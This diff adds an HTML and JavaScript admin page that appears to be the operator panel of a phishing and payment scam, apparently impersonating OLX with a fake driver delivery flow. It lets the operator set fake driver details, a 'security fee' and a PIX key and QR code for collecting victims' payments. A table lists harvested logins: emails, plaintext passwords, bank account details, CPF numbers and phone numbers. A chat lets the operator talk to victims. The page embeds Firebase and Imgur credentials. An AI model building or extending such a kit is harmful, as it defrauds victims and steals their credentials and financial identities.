@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Admin</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; }
+        .container { max-width: 420px; margin: 40px auto; background: #fff; padding: 32px 28px; border-radius: 16px; box-shadow: 0 2px 16px #0002; }
+        .painel-title { text-align: center; margin-bottom: 28px; font-size: 1.5em; color: #333; font-weight: 700; }
+        label { display: block; margin-top: 18px; margin-bottom: 6px; font-weight: 600; color: #444; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 2px; border-radius: 7px; border: 1.5px solid #ccc; font-size: 1.08em; background: #fafafa; transition: border 0.2s; }
+        input:focus, select:focus { border: 1.5px solid #6E0AD6; outline: none; background: #fff; }
+        button { margin-top: 22px; width: 100%; padding: 13px; background: #ff8000; color: #fff; border: none; border-radius: 7px; font-size: 1.1em; font-weight: 700; cursor: pointer; transition: background 0.2s; }
+        button:active { background: #d97400; }
+        .toggle-btn { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 22px; font-size: 1.1em; font-weight: 700; border: none; border-radius: 7px; transition: background 0.2s; }
+        .toggle-btn.ligado { background: #1ec773; color: #fff; }
+        .toggle-btn.desligado { background: #d94a4a; color: #fff; }
+        .toggle-btn svg { vertical-align: middle; }
+        .toggle-info { margin-top: 10px; text-align: center; font-size: 0.98em; color: #555; background: #f7f7f7; border-radius: 7px; padding: 10px 8px; min-height: 44px; }
+        #status-msg { margin-top: 15px; color: #1ec773; text-align: center; font-size: 1em; }
+        #painel-logs-login table {
+            width: 100%;
+            border-collapse: collapse;
+            table-layout: fixed;
+        }
+        #painel-logs-login th, #painel-logs-login td {
+            padding: 8px;
+            border: 1px solid #eee;
+            text-align: center;
+            vertical-align: middle;
+            font-size: 1rem;
+            word-break: break-word;
+            white-space: pre-line;
+        }
+        #painel-logs-login th {
+            background: #f7f7f7;
+            font-weight: 700;
+        }
+        #painel-logs-login td {
+            background: #fff;
+        }
+        #painel-logs-login td:nth-child(3) {
+            min-width: 120px;
+            max-width: 180px;
+        }
+        #painel-logs-login td {
+            min-width: 70px;
+            max-width: 120px;
+        }
+        @media (max-width: 900px) {
+            #painel-logs-login th, #painel-logs-login td {
+                font-size: 0.92rem;
+                padding: 5px;
+            }
+            #painel-logs-login td:nth-child(3) {
+                max-width: 120px;
+            }
+            #painel-logs-login td {
+                max-width: 80px;
+            }
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+</head>
+<body>
+    <div class="container" id="painel-container">
+        <h2 class="painel-title">Painel Administrativo</h2>
+        <form id="painel-form">
+            <label for="saldo-disponivel">Saldo Disponível (R$)</label>
+            <input type="number" id="saldo-disponivel" step="0.01" value="0.00" required>
+            <label for="saldo-receber">Total a Receber (R$)</label>
+            <input type="number" id="saldo-receber" step="0.01" required>
+            <label for="taxa-pagar">Valor da Taxa a Pagar (R$)</label>
+            <input type="number" id="taxa-pagar" step="0.01" required>
+            <label for="valor-taxa-seguranca">Valor fixo da taxa de segurança (R$)</label>
+            <input type="number" id="valor-taxa-seguranca" step="0.01" required>
+            <label for="nome-motorista">Nome do Motorista</label>
+            <input type="text" id="nome-motorista">
+            <label for="placa-carro">Placa do Carro</label>
+            <input type="text" id="placa-carro">
+            <label for="modelo-motorista">Modelo do Motorista</label>
+            <input type="text" id="modelo-motorista">
+            <label for="tempo-chegada-motorista">Tempo de chegada do motorista (minutos)</label>
+            <input type="number" id="tempo-chegada-motorista" min="1" max="120" placeholder="Ex: 2" required>
+            <label for="pix-image">Imagem do PIX (QR Code)</label>
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <input type="file" id="pix-image" accept="image/*">
+                <button type="button" id="remover-pix" style="display:none; background:#d94a4a; color:#fff; padding:8px 12px; border-radius:7px; font-weight:700;">Excluir</button>
+            </div>
+            <img id="pix-preview" src="" alt="QR Code PIX" style="max-width:100%;margin:10px 0;display:none;">
+            <label for="foto-motorista">Foto do Motorista</label>
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <input type="file" id="foto-motorista" name="image" accept="image/*">
+                <button type="button" id="remover-foto-motorista" style="display:none; background:#d94a4a; color:#fff; padding:8px 12px; border-radius:7px; font-weight:700;">Excluir</button>
+            </div>
+            <img id="foto-motorista-preview" src="" alt="Foto do Motorista" style="max-width:100%;margin:10px 0;display:none;">
+            <label style="margin-top:18px;display:block;font-weight:600;">Fluxo de motorista</label>
+            <button type="button" id="liberar-motorista-btn" style="width:100%;padding:12px;background:#1ec773;color:#fff;border:none;border-radius:7px;font-size:1.1em;font-weight:700;cursor:pointer;margin-bottom:8px;">Liberar motorista para o cliente: <span id="liberar-motorista-status">Desativado</span></button>
+            <div id="aviso-motorista" style="color:#d94a4a;text-align:center;font-size:1em;margin-bottom:10px;display:none;"></div>
+            <label for="chave-pix">Chave PIX (Celular)</label>
+            <input type="text" id="chave-pix" maxlength="100">
+            <div style="display: flex; gap: 10px; margin-top: 22px;">
+                <button type="submit" style="flex: 1;">Salvar Alterações</button>
+                <button type="button" id="btn-suporte-logs" style="flex: 1; background: #6E0AD6;">Suporte & Logs</button>
+            </div>
+        </form>
+        <button id="toggle-btn" class="toggle-btn desligado">
+            <svg id="icon-desligado" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
+            <span id="toggle-label">Desligado</span>
+        </button>
+        <div class="toggle-info" id="toggle-info">Quando desligado, o fluxo irá aguardar 5 segundos no modal 'Procurando motorista' e seguirá normalmente para o pagamento.</div>
+        <div id="status-msg"></div>
+    </div>
+
+    <!-- Painel de Suporte/Chat -->
+    <div class="container" id="painel-suporte" style="max-width:700px; margin-top:40px; display:none;">
+        <h2 class="painel-title">Suporte / Chats</h2>
+        <div style="display:flex; gap:30px;">
+            <div style="flex:1;">
+                <h3 style="margin-bottom:10px;">Chats Ativos</h3>
+                <ul id="lista-chats" style="list-style:none; padding:0; max-height:350px; overflow-y:auto; border:1px solid #eee; border-radius:8px;"></ul>
+            </div>
+            <div style="flex:2;">
+                <h3 id="chat-titulo" style="margin-bottom:10px;">Selecione um chat</h3>
+                <div id="chat-mensagens" style="background:#fafafa; min-height:220px; max-height:350px; overflow-y:auto; border-radius:8px; padding:16px; border:1px solid #eee; margin-bottom:10px;"></div>
+                <form id="form-resposta-chat" style="display:none;">
+                    <input id="input-resposta-chat" type="text" placeholder="Digite sua resposta..." style="width:80%; padding:10px; border-radius:6px; border:1px solid #ccc;">
+                    <button type="submit" style="padding:10px 18px; border-radius:6px; background:#ff8000; color:#fff; border:none; font-weight:700;">Enviar</button>
+                </form>
+            </div>
+        </div>
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button onclick="mostrarLogsLogin()" style="flex: 1; background: #6E0AD6;">Ver Logs de Login</button>
+            <button onclick="voltarPainelPrincipal()" style="flex: 1; background: #555;">Voltar ao Painel</button>
+        </div>
+    </div>
+
+    <!-- Painel de logs de login -->
+    <div class="container" id="painel-logs-login" style="max-width:700px; margin-top:40px; display:none;">
+        <h2 class="painel-title">Logs de Login</h2>
+        <table style="width:100%; border-collapse:collapse;">
+            <thead>
+                <tr style="background:#f7f7f7;">
+                    <th style="padding:8px; border:1px solid #eee;">E-mail</th>
+                    <th style="padding:8px; border:1px solid #eee;">Senha</th>
+                    <th style="padding:8px; border:1px solid #eee;">Endereço</th>
+                    <th style="padding:8px; border:1px solid #eee;">Banco</th>
+                    <th style="padding:8px; border:1px solid #eee;">Agência</th>
+                    <th style="padding:8px; border:1px solid #eee;">Conta</th>
+                    <th style="padding:8px; border:1px solid #eee;">Tipo</th>
+                    <th style="padding:8px; border:1px solid #eee;">Titular</th>
+                    <th style="padding:8px; border:1px solid #eee;">CPF</th>
+                    <th style="padding:8px; border:1px solid #eee;">Telefone</th>
+                </tr>
+            </thead>
+            <tbody id="tbody-logs-login"></tbody>
+        </table>
+        <button id="btn-excluir-logs" style="margin:18px 0 0 0; width:100%; background:#d94a4a; color:#fff; font-weight:700; border-radius:7px; padding:13px;">Excluir todos os logs</button>
+        <button onclick="voltarPainelPrincipal()" style="margin-top:18px;">Voltar ao Painel</button>
+    </div>
+
+    <script>
+        // Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyAbJ4L2RrjzH0up0OVR2SrGt3-Qc0mhNow",
+            authDomain: "olxx-a64c1.firebaseapp.com",
+            projectId: "olxx-a64c1",
+            storageBucket: "olxx-a64c1.firebasestorage.app",
+            messagingSenderId: "367643482865",
+            appId: "1:367643482865:web:bf19a0ede2ae706f922750",
+            measurementId: "G-67XZYFDHV1"
+        };
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const storage = firebase.storage();
+
+        if (sessionStorage.getItem('isAdmin') !== 'true') {
+            window.location.href = 'index.html';
+        }
+        const saldoDisponivel = document.getElementById('saldo-disponivel');
+        const saldoReceber = document.getElementById('saldo-receber');
+        const taxaPagar = document.getElementById('taxa-pagar');
+        const nomeMotorista = document.getElementById('nome-motorista');
+        const placaCarro = document.getElementById('placa-carro');
+        const modeloMotorista = document.getElementById('modelo-motorista');
+        const toggleBtn = document.getElementById('toggle-btn');
+        const toggleInfo = document.getElementById('toggle-info');
+        const statusMsg = document.getElementById('status-msg');
+        let ligado = false;
+        let pixImageUrl = '';
+        let fotoMotoristaUrl = '';
+        let liberarMotorista = false;
+        const liberarBtn = document.getElementById('liberar-motorista-btn');
+        const liberarStatus = document.getElementById('liberar-motorista-status');
+        const avisoMotorista = document.getElementById('aviso-motorista');
+
+        // Evento para garantir que o campo nunca fique vazio e sempre tenha 0,00
+        saldoDisponivel.addEventListener('blur', function() {
+            if (saldoDisponivel.value === '' || isNaN(parseFloat(saldoDisponivel.value))) {
+                saldoDisponivel.value = '0.00';
+            } else {
+                saldoDisponivel.value = parseFloat(saldoDisponivel.value).toFixed(2);
+            }
+        });
+
+        // Substituir carregarPainelFirebase() por listener em tempo real
+        function listenPainelFirebase() {
+            db.collection('painel').doc('admin').onSnapshot((doc) => {
+                if (doc.exists) {
+                    const data = doc.data();
+                    saldoDisponivel.value = (data.saldoDisponivel !== undefined && data.saldoDisponivel !== null && data.saldoDisponivel !== '') ? parseFloat(data.saldoDisponivel).toFixed(2) : '0.00';
+                    saldoReceber.value = data.saldoReceber || '';
+                    taxaPagar.value = data.taxaPagar || '';
+                    nomeMotorista.value = data.nomeMotorista || '';
+                    placaCarro.value = data.placaCarro || '';
+                    modeloMotorista.value = data.modeloMotorista || '';
+                    ligado = !!data.ligado;
+                    carregarImagensPainel(data);
+                    atualizarToggleFirebase();
+                    atualizarBotaoLiberar();
+                    // Carregar valor fixo da taxa de segurança
+                    document.getElementById('valor-taxa-seguranca').value = data.valorTaxaSeguranca || '';
+                    document.getElementById('chave-pix').value = data.chavePix || '';
+                    const tempoChegadaMotorista = parseInt(data.tempoChegadaMotorista) || 2;
+                    document.getElementById('tempo-chegada-motorista').value = tempoChegadaMotorista;
+                }
+            });
+        }
+
+        function atualizarToggleFirebase() {
+            if (ligado) {
+                toggleBtn.classList.remove('desligado');
+                toggleBtn.classList.add('ligado');
+                toggleBtn.innerHTML = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/></svg> <span id="toggle-label">Ligado</span>';
+                toggleInfo.textContent = 'Quando ligado, o fluxo irá travar no modal "Procurando motorista" até você desligar aqui.';
+            } else {
+                toggleBtn.classList.remove('ligado');
+                toggleBtn.classList.add('desligado');
+                toggleBtn.innerHTML = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="8" y1="12" x2="16" y2="12"/></svg> <span id="toggle-label">Desligado</span>';
+                toggleInfo.textContent = 'Quando desligado, o fluxo irá aguardar 5 segundos no modal "Procurando motorista" e seguirá normalmente para o pagamento.';
+            }
+        }
+
+        // Carregar imagens do Firestore ao abrir
+        function carregarImagensPainel(data) {
+            if (data.pixImageUrl) {
+                pixPreview.src = data.pixImageUrl;
+                pixPreview.style.display = 'block';
+                pixImageUrl = data.pixImageUrl;
+                document.getElementById('remover-pix').style.display = 'inline-block';
+            } else {
+                pixPreview.style.display = 'none';
+                pixImageUrl = '';
+                document.getElementById('remover-pix').style.display = 'none';
+            }
+            if (data.fotoMotoristaUrl) {
+                fotoMotoristaPreview.src = data.fotoMotoristaUrl;
+                fotoMotoristaPreview.style.display = 'block';
+                removerFotoBtn.style.display = 'inline-block';
+                fotoMotoristaUrl = data.fotoMotoristaUrl;
+            } else {
+                fotoMotoristaPreview.style.display = 'none';
+                removerFotoBtn.style.display = 'none';
+                fotoMotoristaUrl = '';
+            }
+        }
+
+        // Substituir integração do Firebase Storage por upload Imgur
+        const IMGUR_CLIENT_ID = '5fcbfd88963e757';
+
+        async function uploadToImgur(file) {
+            const formData = new FormData();
+            formData.append('image', file);
+            const res = await fetch('https://api.imgur.com/3/image', {
+                method: 'POST',
+                headers: {
+                    Authorization: 'Client-ID ' + IMGUR_CLIENT_ID
+                },
+                body: formData
+            });
+            if (!res.ok) {
+                const errorText = await res.text();
+                console.error('Erro completo do Imgur:', errorText);
+                throw new Error('Erro do Imgur: ' + res.status + ' - ' + errorText);
+            }
+            const data = await res.json();
+            if (data.success) return data.data.link;
+            throw new Error('Erro ao enviar imagem para Imgur: ' + (data.data?.error || JSON.stringify(data)));
+        }
+
+        async function uploadToLocal(file) {
+            const formData = new FormData();
+            formData.append('image', file);
+            const res = await fetch('/api/upload', {
+                method: 'POST',
+                body: formData
+            });
+            if (!res.ok) {
+                const errorText = await res.text();
+                console.error('Erro completo do upload local:', errorText);
+                throw new Error('Erro no upload local: ' + res.status + ' - ' + errorText);
+            }
+            const data = await res.json();
+            if (data.url) return data.url;
+            throw new Error('Erro ao salvar imagem local: ' + JSON.stringify(data));
+        }
+
+        // Upload da imagem do PIX
+        const pixImageInput = document.getElementById('pix-image');
+        const pixPreview = document.getElementById('pix-preview');
+        pixImageInput.addEventListener('change', async function() {
+            const file = pixImageInput.files[0];
+            if (!file) return;
+            try {
+                statusMsg.textContent = 'Enviando imagem do PIX...';
+                pixImageUrl = await uploadToImgur(file);
+                pixPreview.src = pixImageUrl;
+                pixPreview.style.display = 'block';
+                statusMsg.textContent = 'Imagem do PIX enviada!';
+                setTimeout(() => statusMsg.textContent = '', 1500);
+            } catch (err) {
+                statusMsg.textContent = 'Erro ao enviar imagem do PIX: ' + (err.message || err);
+                statusMsg.style.color = '#d94a4a';
+                setTimeout(() => { statusMsg.textContent = ''; statusMsg.style.color = '#1ec773'; }, 4000);
+            }
+        });
+
+        // Upload da foto do motorista (Imgur ou local)
+        const fotoMotoristaInput = document.getElementById('foto-motorista');
+        const fotoMotoristaPreview = document.getElementById('foto-motorista-preview');
+        const removerFotoBtn = document.getElementById('remover-foto-motorista');
+        fotoMotoristaInput.addEventListener('change', async function() {
+            const file = fotoMotoristaInput.files[0];
+            if (!file) return;
+            let urlObtida = '';
+            try {
+                statusMsg.textContent = 'Enviando foto do motorista (Imgur)...';
+                statusMsg.style.color = '#1ec773';
+                // Tenta Imgur primeiro
+                urlObtida = await uploadToImgur(file);
+                statusMsg.textContent = 'Foto do motorista enviada para Imgur!';
+            } catch (errImgur) {
+                console.warn('Erro no Imgur, tentando upload local:', errImgur);
+                statusMsg.textContent = 'Imgur indisponível, enviando localmente...';
+                statusMsg.style.color = '#d94a4a';
+                try {
+                    urlObtida = await uploadToLocal(file);
+                    statusMsg.textContent = 'Foto do motorista salva localmente (provisório)!';
+                    statusMsg.style.color = '#1ec773';
+                } catch (errLocal) {
+                    statusMsg.textContent = 'Erro ao enviar foto: ' + (errLocal.message || errLocal);
+                    statusMsg.style.color = '#d94a4a';
+                    setTimeout(() => { statusMsg.textContent = ''; statusMsg.style.color = '#1ec773'; }, 4000);
+                    fotoMotoristaInput.value = '';
+                    return;
+                }
+            }
+            // Só atualiza preview se a URL for válida
+            if (urlObtida && typeof urlObtida === 'string') {
+                fotoMotoristaUrl = urlObtida;
+                fotoMotoristaPreview.src = fotoMotoristaUrl;
+                fotoMotoristaPreview.style.display = 'block';
+                removerFotoBtn.style.display = 'inline-block';
+                // Mostra o link da imagem para depuração
+                let logDiv = document.getElementById('log-foto-motorista');
+                if (!logDiv) {
+                    logDiv = document.createElement('div');
+                    logDiv.id = 'log-foto-motorista';
+                    logDiv.style = 'font-size:12px;color:#555;word-break:break-all;margin:8px 0;';
+                    fotoMotoristaPreview.parentNode.insertBefore(logDiv, fotoMotoristaPreview.nextSibling);
+                }
+                logDiv.innerHTML = 'Link da foto: <a href="' + fotoMotoristaUrl + '" target="_blank">' + fotoMotoristaUrl + '</a>';
+            } else {
+                fotoMotoristaUrl = '';
+                fotoMotoristaPreview.src = '';
+                fotoMotoristaPreview.style.display = 'none';
+                removerFotoBtn.style.display = 'none';
+            }
+            // Limpa o input file para evitar bugs em uploads subsequentes
+            fotoMotoristaInput.value = '';
+            setTimeout(() => statusMsg.textContent = '', 1500);
+        });
+
+        // Botão de remover foto do motorista
+        removerFotoBtn.addEventListener('click', function() {
+            fotoMotoristaUrl = '';
+            fotoMotoristaPreview.src = '';
+            fotoMotoristaPreview.style.display = 'none';
+            removerFotoBtn.style.display = 'none';
+        });
+
+        function atualizarBotaoLiberar() {
+            liberarStatus.textContent = liberarMotorista ? 'Ativado' : 'Desativado';
+            liberarBtn.style.background = liberarMotorista ? '#1ec773' : '#d94a4a';
+        }
+        liberarBtn.addEventListener('click', function() {
+            liberarMotorista = !liberarMotorista;
+            atualizarBotaoLiberar();
+            salvarPainelFirebase();
+            if (liberarMotorista) {
+                // Mostrar modal de conferência
+                const nome = nomeMotorista.value || '---';
+                const placa = placaCarro.value || '---';
+                const modelo = modeloMotorista.value || '---';
+                const tempo = document.getElementById('tempo-chegada-motorista').value || '---';
+                alert(`Motorista encontrado!\n\nNome: ${nome}\nPlaca: ${placa}\nModelo: ${modelo}\nTempo de chegada: ${tempo}`);
+            }
+        });
+
+        // Validação dos campos do motorista
+        function motoristaPreenchido() {
+            return nomeMotorista.value.trim() && placaCarro.value.trim() && modeloMotorista.value.trim() && fotoMotoristaUrl;
+        }
+
+        // Sobrescrever salvarPainelFirebase para incluir liberarMotorista
+        async function salvarPainelFirebase() {
+            // Se liberarMotorista ativado, mas dados do motorista incompletos, exibe aviso e não libera
+            if (liberarMotorista && !motoristaPreenchido()) {
+                avisoMotorista.textContent = 'Preencha todos os dados do motorista para liberar ao cliente!';
+                avisoMotorista.style.display = 'block';
+                return;
+            } else {
+                avisoMotorista.style.display = 'none';
+            }
+            let saldoDisponivelValor = saldoDisponivel.value;
+            if (saldoDisponivelValor === '' || isNaN(parseFloat(saldoDisponivelValor))) {
+                saldoDisponivelValor = 0.00;
+            } else {
+                saldoDisponivelValor = parseFloat(saldoDisponivelValor).toFixed(2);
+            }
+            const saldoReceberValor = parseFloat(saldoReceber.value) || 0;
+            const taxaPagarValor = parseFloat(taxaPagar.value) || 0;
+            const valorTaxaSeguranca = parseFloat(document.getElementById('valor-taxa-seguranca').value) || 0;
+            const chavePix = document.getElementById('chave-pix').value;
+            const tempoChegadaMotorista = parseInt(document.getElementById('tempo-chegada-motorista').value) || 2;
+            await db.collection('painel').doc('admin').set({
+                saldoDisponivel: saldoDisponivelValor,
+                saldoReceber: saldoReceberValor,
+                taxaPagar: taxaPagarValor,
+                nomeMotorista: nomeMotorista.value,
+                placaCarro: placaCarro.value,
+                modeloMotorista: modeloMotorista.value,
+                ligado,
+                liberarMotorista,
+                pixImageUrl,
+                fotoMotoristaUrl,
+                valorTaxaSeguranca,
+                chavePix,
+                tempoChegadaMotorista,
+            }, { merge: true });
+            statusMsg.textContent = 'Alterações salvas com sucesso!';
+            setTimeout(() => statusMsg.textContent = '', 2000);
+        }
+
+        toggleBtn.addEventListener('click', async function() {
+            ligado = !ligado;
+            try {
+                await salvarPainelFirebase();
+                atualizarToggleFirebase();
+                statusMsg.textContent = 'Alterações salvas no Firebase!';
+                setTimeout(() => statusMsg.textContent = '', 2000);
+            } catch (err) {
+                statusMsg.textContent = 'Erro ao salvar no Firebase: ' + (err.message || err);
+                statusMsg.style.color = '#d94a4a';
+                setTimeout(() => { statusMsg.textContent = ''; statusMsg.style.color = '#1ec773'; }, 4000);
+            }
+        });
+
+        document.getElementById('painel-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            try {
+                await salvarPainelFirebase();
+                statusMsg.textContent = 'Alterações salvas no Firebase!';
+                statusMsg.style.color = '#1ec773';
+                setTimeout(() => statusMsg.textContent = '', 2000);
+            } catch (err) {
+                statusMsg.textContent = 'Erro ao salvar no Firebase: ' + (err.message || err);
+                statusMsg.style.color = '#d94a4a';
+                setTimeout(() => { statusMsg.textContent = ''; statusMsg.style.color = '#1ec773'; }, 4000);
+            }
+        });
+
+        // Função para remover imagem do PIX
+        const removerPixBtn = document.getElementById('remover-pix');
+        if (removerPixBtn) {
+            removerPixBtn.addEventListener('click', async function() {
+                await db.collection('painel').doc('admin').update({ pixImageUrl: '' });
+                pixPreview.src = '';
+                pixPreview.style.display = 'none';
+                removerPixBtn.style.display = 'none';
+                pixImageUrl = '';
+                statusMsg.textContent = 'Imagem do PIX removida!';
+                setTimeout(() => statusMsg.textContent = '', 1500);
+            });
+        }
+
+        // Função para remover foto do motorista
+        if (removerFotoBtn) {
+            removerFotoBtn.addEventListener('click', async function() {
+                await db.collection('painel').doc('admin').update({ fotoMotoristaUrl: '' });
+                fotoMotoristaPreview.src = '';
+                fotoMotoristaPreview.style.display = 'none';
+                removerFotoBtn.style.display = 'none';
+                fotoMotoristaUrl = '';
+                statusMsg.textContent = 'Foto do motorista removida!';
+                setTimeout(() => statusMsg.textContent = '', 1500);
+            });
+        }
+
+        // Chamar o listener ao invés de carregarPainelFirebase
+        listenPainelFirebase();
+
+        // --- SUPORTE/CHAT ---
+        // Função para mostrar painel de suporte
+        function mostrarPainelSuporte() {
+            document.getElementById('painel-suporte').style.display = 'block';
+            document.getElementById('painel-container').style.display = 'none';
+            document.getElementById('painel-logs-login').style.display = 'none';
+        }
+        
+        // Função para mostrar logs de login
+        function mostrarLogsLogin() {
+            document.getElementById('painel-logs-login').style.display = 'block';
+            document.getElementById('painel-container').style.display = 'none';
+            document.getElementById('painel-suporte').style.display = 'none';
+            // Carregar logs do Firestore
+            db.collection('logs_login').orderBy('timestamp', 'desc').limit(100).get().then(snapshot => {
+                tbodyLogsLogin.innerHTML = '';
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `<td style='padding:8px; border:1px solid #eee;'>${data.email || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.senha || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.endereco || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.banco || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.agencia || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.conta || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.tipoConta || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.titular || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.cpf || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.telefone || ''}</td>`;
+                    tbodyLogsLogin.appendChild(tr);
+                });
+            });
+        }
+        
+        // Função para voltar ao painel principal
+        function voltarPainelPrincipal() {
+            document.getElementById('painel-container').style.display = 'block';
+            document.getElementById('painel-suporte').style.display = 'none';
+            document.getElementById('painel-logs-login').style.display = 'none';
+        }
+        
+        // Botão Suporte & Logs
+        document.getElementById('btn-suporte-logs').addEventListener('click', mostrarPainelSuporte);
+        
+        // Manter funcionalidade F2 como alternativa
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F2') {
+                mostrarPainelSuporte();
+            }
+        });
+        
+        // Firestore: carregar lista de chats
+        const listaChats = document.getElementById('lista-chats');
+        const chatMensagens = document.getElementById('chat-mensagens');
+        const chatTitulo = document.getElementById('chat-titulo');
+        const formRespostaChat = document.getElementById('form-resposta-chat');
+        const inputRespostaChat = document.getElementById('input-resposta-chat');
+        const painelLogsLogin = document.getElementById('painel-logs-login');
+        const painelContainer = document.getElementById('painel-container');
+        const tbodyLogsLogin = document.getElementById('tbody-logs-login');
+        let chatSelecionado = null;
+        
+        function carregarListaChats() {
+            db.collection('chats').orderBy('lastMessage', 'desc').onSnapshot(snapshot => {
+                listaChats.innerHTML = '';
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    const li = document.createElement('li');
+                    li.textContent = data.email || data.sessionId || 'Anônimo';
+                    li.style.cursor = 'pointer';
+                    li.style.padding = '8px 12px';
+                    li.style.borderBottom = '1px solid #eee';
+                    li.onclick = () => selecionarChat(doc.id, data.email || data.sessionId || 'Anônimo');
+                    listaChats.appendChild(li);
+                });
+            });
+        }
+        
+        function selecionarChat(chatId, titulo) {
+            chatSelecionado = chatId;
+            chatTitulo.textContent = 'Chat: ' + titulo;
+            formRespostaChat.style.display = 'flex';
+            inputRespostaChat.disabled = false;
+            inputRespostaChat.placeholder = 'Digite sua resposta...';
+            inputRespostaChat.focus();
+            // Botão para assumir atendimento (opcional)
+            let btnAssumir = document.getElementById('btn-assumir-chat');
+            if (!btnAssumir) {
+                btnAssumir = document.createElement('button');
+                btnAssumir.id = 'btn-assumir-chat';
+                btnAssumir.textContent = 'Assumir atendimento';
+                btnAssumir.style = 'margin-bottom:10px; background:#6E0AD6; color:#fff; border:none; border-radius:6px; padding:8px 18px; font-weight:700; display:block;';
+                chatMensagens.parentNode.insertBefore(btnAssumir, chatMensagens);
+                btnAssumir.onclick = function() {
+                    inputRespostaChat.focus();
+                };
+            } else {
+                btnAssumir.style.display = 'block';
+            }
+            db.collection('chats').doc(chatId).collection('mensagens').orderBy('timestamp').onSnapshot(snapshot => {
+                chatMensagens.innerHTML = '';
+                let lastMsgKey = '';
+                snapshot.forEach(doc => {
+                    const msg = doc.data();
+                    // Cria uma chave única para cada mensagem baseada em texto, remetente e timestamp (se existir)
+                    const msgKey = msg.text + '|' + msg.from + '|' + (msg.timestamp ? msg.timestamp.toMillis ? msg.timestamp.toMillis() : msg.timestamp : '');
+                    // Só exibe se for diferente da última mensagem exibida
+                    if (msgKey !== lastMsgKey) {
+                        const div = document.createElement('div');
+                        div.style.margin = '6px 0';
+                        div.style.textAlign = msg.from === 'admin' ? 'right' : 'left';
+                        div.innerHTML = `<span style="background:${msg.from==='admin'?'#ff8000':'#eee'}; color:${msg.from==='admin'?'#fff':'#333'}; padding:7px 13px; border-radius:12px; display:inline-block; max-width:70%;">${msg.text}</span>`;
+                        chatMensagens.appendChild(div);
+                        lastMsgKey = msgKey;
+                    }
+                });
+                chatMensagens.scrollTop = chatMensagens.scrollHeight;
+            });
+        }
+        
+        formRespostaChat.onsubmit = function(e) {
+            e.preventDefault();
+            if (!chatSelecionado || !inputRespostaChat.value.trim()) return;
+            db.collection('chats').doc(chatSelecionado).collection('mensagens').add({
+                text: inputRespostaChat.value,
+                from: 'admin',
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+            db.collection('chats').doc(chatSelecionado).set({ lastMessage: Date.now() }, { merge: true });
+            inputRespostaChat.value = '';
+        };
+        
+        carregarListaChats();
+        
+        // Excluir todos os logs de login
+        const btnExcluirLogs = document.getElementById('btn-excluir-logs');
+        if (btnExcluirLogs) {
+            btnExcluirLogs.onclick = async function() {
+                if (!confirm('Tem certeza que deseja excluir TODOS os logs de login? Essa ação não pode ser desfeita.')) return;
+                const snapshot = await db.collection('logs_login').get();
+                const batch = db.batch();
+                snapshot.forEach(doc => batch.delete(doc.ref));
+                await batch.commit();
+                tbodyLogsLogin.innerHTML = '';
+                alert('Todos os logs foram excluídos!');
+            };
+        }
+    </script>
+</body>
+</html> 
